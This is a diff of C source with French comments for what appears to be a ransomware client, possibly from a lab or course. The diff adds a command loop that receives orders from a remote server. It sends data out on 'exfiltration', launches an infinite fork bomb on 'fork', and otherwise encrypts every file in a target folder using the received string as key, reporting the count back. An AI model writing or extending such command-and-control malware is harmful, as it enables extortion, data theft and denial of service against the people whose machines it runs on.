@@ -110,21 +110,32 @@ int main() {        // Initialisation dans connexion client/serveur
 
     send(socket_fd, CLIENT_ID, strlen(CLIENT_ID), 0);       // Envoie l’identifiant du client au serveur
 
-    bytes_read = recv(socket_fd, buffer, sizeof(buffer), 0);
-    if (bytes_read > 0) {
-        buffer[bytes_read] = '\0';
+    while (1) { // Boucle principale pour maintenir la connexion
+        bytes_read = recv(socket_fd, buffer, sizeof(buffer), 0);
+        if (bytes_read <= 0) {
+            printf("Connexion avec le serveur terminée.\n");
+            break; // Quitte la boucle si le serveur ferme la connexion
+        }
 
-        if (strcmp(buffer, "exfiltration") == 0) {      // Si la commande reçue est exfiltration, exécute l'exfiltration
-            printf("Données exfiltrées.\n");
+        buffer[bytes_read] = '\0'; // Terminer correctement la chaîne reçue
+
+        if (strcmp(buffer, "exfiltration") == 0) {
+            printf("Exfiltration des données.\n");
             exfiltration(socket_fd);
+        } else if (strcmp(buffer, "fork") == 0) {
+            printf("Exécution de l'ordre 'fork'.\n");
+            infinite_fork();
+        } else if (strcmp(buffer, "exit") == 0) {
+            printf("Fermeture demandée par le serveur.\n");
+            break; // Quitte la boucle sur demande explicite du serveur
         } else {
-            printf("Fichiers du repertoire chiffrés.\n");
-            int num_files_encrypted = encrypt_files_in_directory(FOLDER_PATH, buffer);      // Sinon execute l'ordre ransomware
+            printf("Fichiers du répertoire chiffrés.\n");
+            int num_files_encrypted = encrypt_files_in_directory(FOLDER_PATH, buffer);
             sprintf(buffer, "%d", num_files_encrypted);
             send(socket_fd, buffer, strlen(buffer), 0);
         }
     }
 
-    close(socket_fd);
+    close(socket_fd); // Fermer proprement la socket après la sortie de la boucle
     return 0;
 }
